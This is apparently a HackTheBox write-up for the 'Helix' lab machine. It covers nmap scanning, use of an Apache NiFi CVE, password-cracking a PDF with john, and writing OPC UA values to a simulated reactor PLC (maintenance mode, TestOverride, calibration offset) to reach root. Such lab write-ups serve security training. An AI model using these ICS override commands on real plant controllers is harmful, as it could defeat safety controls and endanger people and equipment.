---
title: Helix
date: 2026-05-28
category: [HackTheBox, Linux]
tags: [nmap, ffuf]
difficulty: Medium
platform: HackTheBox
os: Linux
summary: Helix is a medium rated box on Hack The Box
machine_url: https://app.hackthebox.com/machines/Helix
achievement: https://labs.hackthebox.com/achievement/machine/1737280/894
pinned: true
tldr: |
    - **Initial Access:** Exploited a Remote Code Execution (RCE) vulnerability (CVE-2023-34468) in Apache NiFi exposed via the `flow.helix.htb` vhost, allowing data exfiltration and retrieval of an SSH private key from the `support-bundles` directory to access the machine as `operator`.
    - **Reconnaissance & Enumeration:** Configured local port forwarding to access internal services, cracked a password-protected PDF document using `john` to discover maintenance window criteria, and enumerated Industrial Control Systems (ICS) OPC UA nodes (`opc.tcp`) using `uabrowse`.
    - **Privilege Escalation:** Modified PLC/SCADA states over the OPC UA protocol (switching control mode to `maintenance`, enabling `TestOverride`, and adjusting calibration offsets) to trigger the maintenance window, enabling the execution of a `sudo` binary to achieve full root privileges.
---

# Recon
---
Start with a full TCP scan:
```bash
nmap -sVC -sS -vv -p- -T4 -oN nmap-full <IP>

# Nmap 7.99 scan initiated Wed May 13 08:14:00 2026 as: /usr/lib/nmap/nmap -sVC -sS -vv -p- -T4 -oN nmap-full 10.129.70.178
Nmap scan report for helix.htb (10.129.70.178)
Host is up, received reset ttl 63 (0.17s latency).
Scanned at 2026-05-13 08:14:00 +07 for 361s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 60:b3:f7:6c:0b:92:ab:00:ac:e7:12:e1:d1:26:9c:1e (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPTJ+LkpmuH2sQS9dhqnvmpl1NhudGQHvIxfw5Qrhj2MEU4J7VXSPAt/OPas+zeYGU8XOWgNtfnJjHEYe3XsLII=
|   256 c8:30:e6:cb:c6:cd:fc:0c:39:e5:34:04:20:07:b9:b3 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGYnLTVO7QjbF2nWYA4R9O3DaSGllmNuBdWKKZyZxMZS
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Helix Industries | Industrial Automation & Critical Infrastruc...
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed May 13 08:20:01 2026 -- 1 IP address (1 host up) scanned in 361.33 seconds
```
- 22/TCP: OpenSSH 8.9p1
- 80/TCP: nginx 1.18.0
A vhost enumeration reveals `flow.helix.htb`.
CVE-2023-34468
found operator's private key in support-bundles directory -> ssh as operator
sudo -l shows operator is allowed to run a binary as root (NOPASSWD)
ss -tuln shows multiple services listening on loopback
The service on port 4840 is speaking opc.tcp
The service on port 8081 is Reactor HMI
port forwarding all those ports to local machine:
```bash
ssh -i ssh_key operator@helix.htb -L 8080:127.0.0.1:8080 -L 8081:127.0.0.1:8081 -L 4840:127.0.0.1:4840 -L 34973:127.0.0.1:34973
```
Running `sudo -l` reveals that operator user can run a binary as root:
```bash
operator@helix:~$ sudo -l

Matching Defaults entries for operator on helix:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
User operator may run the following commands on helix: (root) NOPASSWD: /usr/local/sbin/helix-maint-console operator@helix:~$
```
The binary will drop us into a root shell if the maintenance console is open.
got an image and a pdf file. The pdf file is password-protected but can try to dictionary attack using john:
first use pdf2john to extract the hash from the pdf then crack it:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt pdf-hash
Using default input encoding: UTF-8
Loaded 1 password hash (PDF [MD5 SHA2 RC4/AES 32/64])
Cost 1 (revision) is 6 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
operator1        (haha.pdf)     
1g 0:00:02:09 DONE (2026-05-28 23:01) 0.007696g/s 2032p/s 2032c/s 2032C/s orphee..olivetree
Use the "--show --format=PDF" options to display all of the cracked passwords reliably
Session completed.
```
Enumerate opc.tcp using uabrowse:
```bash
uabrowse -u opc.tcp://localhost:4840/helix/                                                                                        
Browsing node i=84 at opc.tcp://localhost:4840/helix/                                                                                  
                                                                                                                                       
DisplayName                    NodeId                    BrowseName                Value                                               
                                                                                                                                       
LocalizedText(Locale=None, Text='Objects') i=85                      0:Objects                                                         
LocalizedText(Locale=None, Text='Types') i=86                      0:Types                                                             
LocalizedText(Locale=None, Text='Views') i=87                      0:Views
```
Enumerate further to node i=85:
```bash
uabrowse -u opc.tcp://localhost:4840/helix/ -n "i=85"                                                                              
Browsing node i=85 at opc.tcp://localhost:4840/helix/                                                                                  
                                                                                                                                       
DisplayName                    NodeId                    BrowseName                Value                                               
                                                                                                                                       
LocalizedText(Locale=None, Text='Locations') i=31915                   0:Locations                                                     
LocalizedText(Locale=None, Text='Server') i=2253                    0:Server                                                           
LocalizedText(Locale=None, Text='Aliases') i=23470                   0:Aliases                                                         
LocalizedText(Locale=None, Text='Plant') ns=2;i=1                  2:Plant
```
Got a non-default namespace ns=2;i=1, try enumerate with that node:
```bash
uabrowse -u opc.tcp://localhost:4840/helix/ -n "ns=2;i=1"                                                                          
Browsing node ns=2;i=1 at opc.tcp://localhost:4840/helix/                                                                              
                                                                                                                                       
DisplayName                    NodeId                    BrowseName                Value                                               
                                                                                                                                       
LocalizedText(Locale=None, Text='Reactor') ns=2;i=2                  2:Reactor                                                         
LocalizedText(Locale=None, Text='Safety') ns=2;i=7                  2:Safety                                                           
LocalizedText(Locale=None, Text='Control') ns=2;i=11                 2:Control
```
3 Nodes as indicated in the image and on the dashboard in port 8081
So the pdf file reveal some useful information:
- in order for the calibration offset to be recognized by the PLC, the mode must be changed to MAINTENANCE, and TestOverride must be enabled.
- The maintenance window opens when:
• Temperature reaches approximately **295°C OR Pressure 73 bar
• Pressure & Temp remains below trip thresholds
• No safety trip is active (Trip threshold is 305)
So the opc nodes that need to be intefered:
- Control mode: ns=2;i=12 -> set to MAINTENANCE
- Control TestOverride: ns=2;i=13 -> set to True
- Calibration offset: ns=2;i=6 -> set to the value where the new temp is about 295
```bash
┌──(joichiro㉿joichiro)-[~/Labs/HackTheBox/Helix]
└─$ uawrite -u opc.tcp://localhost:4840/helix/ -n "ns=2;i=12" MAINTENANCE
                                                                                                                                       
┌──(joichiro㉿joichiro)-[~/Labs/HackTheBox/Helix]
└─$ uawrite -u opc.tcp://localhost:4840/helix/ -n "ns=2;i=13" True       
Failed to send request to OPC UA server
                                                                                                                                       
┌──(joichiro㉿joichiro)-[~/Labs/HackTheBox/Helix]
└─$ uawrite -u opc.tcp://localhost:4840/helix/ -n "ns=2;i=6" 11.0
```
Now the maintenance window should open and just run the binary with sudo to enter privileged bash session.
